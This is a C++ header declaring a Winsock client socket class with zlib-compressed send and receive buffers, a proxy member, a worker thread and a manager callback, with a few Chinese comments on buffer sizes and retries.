
// ClientSocket.h: interface for the CClientSocket class.
//
//////////////////////////////////////////////////////////////////////
#pragma once

#include "zlib/zlib.h"
#pragma comment(lib,"zlib/zlib.lib")
#include <winsock2.h>
#include <mswsock.h>
#include <process.h>
#include <MSTcpIP.h>
#pragma comment(lib, "ws2_32.lib")
#include "Buffer.h"
#include "Manager.h"

#include "stdafx.h"
#include "Proxy.h"
enum{ 
	HDR_SIZE			=	12,
	FLAG_SIZE			=	4,
	MAX_WRITE_RETRY		=	15 ,		// 重试写入文件次数
	MAX_SEND_BUFFER		=	1024 * 8,	// 最大发送数据长度
	MAX_RECV_BUFFER		=	1024 * 8	// 最大接收数据长度
};
typedef struct COMMANDSTRUCT{
	int     command;
	DWORD	DialogPointer;  // which dialog handle this command
}Cmd;

class CClientSocket  
{
	friend class CManager;
private:
	CProxy	m_proxy;
	CBuffer m_CompressionBuffer;
	CBuffer m_DeCompressionBuffer;
	CBuffer m_WriteBuffer;
	CBuffer	m_ResendWriteBuffer;
	HANDLE	m_hWorkerThread;
	
	
	BYTE	m_bPacketFlag[FLAG_SIZE];
	bool	m_bIsRunning;
	CManager	*m_pManager;
public:
	HANDLE	m_hEvent;
	SOCKET	m_Socket;
public:
	void Disconnect();
	bool Connect(string lpszHost, u_short nPort);
	int  Send(LPBYTE lpData, UINT nSize);
	void OnRead(LPBYTE lpBuffer, DWORD dwIoSize);
	void setManagerCallBack(CManager *pManager);
	void run_event_loop();
	bool IsRunning();
	CClientSocket();
	virtual ~CClientSocket();
private:
	static UINT WINAPI WorkThread(LPVOID lparam);
	int SendWithSplit(LPBYTE lpData, UINT nSize, UINT nSplitSize);
};
